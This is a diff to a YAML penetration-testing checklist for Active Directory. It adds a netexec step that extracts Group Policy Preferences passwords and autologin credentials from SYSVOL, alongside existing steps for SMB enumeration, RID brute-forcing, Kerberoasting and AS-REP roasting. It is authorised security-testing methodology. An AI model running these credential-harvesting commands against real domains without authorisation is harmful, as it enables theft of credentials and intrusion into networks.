@@ -60,4 +60,6 @@
       command: "netexec smb {target} -u USER -p PASS --shares --users --groups --sessions --pass-pol --rid-brute 4000"
     - text: "Request Kerberos SPN + AS-REP tickets for enumeration (crack off-host only if in scope — not run here)"
       command: "netexec ldap {target} -u USER -p PASS --kerberoasting kerb.out --asreproast asrep.out"
+    - text: "Hunt Group Policy Preferences creds in SYSVOL (cpassword / cached autologin)"
+      command: "netexec smb {target} -u USER -p PASS -M gpp_password -M gpp_autologin"
 # source: Obsidian: 0.00 Methodology .../Active Directory Methdology/Full AD enum.md
